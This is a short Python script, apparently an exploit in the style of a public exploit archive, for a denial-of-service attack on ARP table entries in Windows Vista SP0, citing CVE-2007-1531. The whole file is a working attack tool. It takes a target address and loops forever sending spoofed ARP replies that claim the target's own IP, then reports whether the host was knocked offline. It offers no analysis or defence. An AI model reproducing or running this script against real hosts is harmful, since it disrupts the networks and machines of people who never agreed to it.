#!/usr/bin/env python
#Arp Table Entries Denial of Service 
#Microsoft Windows Vista (SP0) [All Versions]
#Reference: CVE-2007-1531

from scapy.all import *
import sys ,threading
 
conf.verb = 0

if len(sys.argv) != 2:
    print "Usage: ATE.py <target>"
    sys.exit(1) 

#sys.tracebacklimit=0
 
class ate(threading.Thread):
    try:
        def __init__(self):
            threading.Thread.__init__(self)
        def run(self):
            a = ARP()
            a.pdst = sys.argv[1]
            a.op = 2

            while True:
                arping = Ether(dst="ff:ff:ff:ff:ff:ff")/a
                ans,unans = srp(arping,timeout=0.1)
                if len(ans) == 1:
                    a.psrc=a.pdst
                    print a.pdst, "is ALIVE!"
                    send(a)
                    ans2,unans2 = srp(arping,timeout=0.1)
                    if len(unans2) == 1:
                        print a.psrc, "Under ATTACK!"
                    else:
                        print "FAILED:", a.pdst, "is still alive!"
                else:
                    print a.pdst, "is already DEAD!"
    except KeyboardInterrupt:
        sys.exit(1)

ate().start()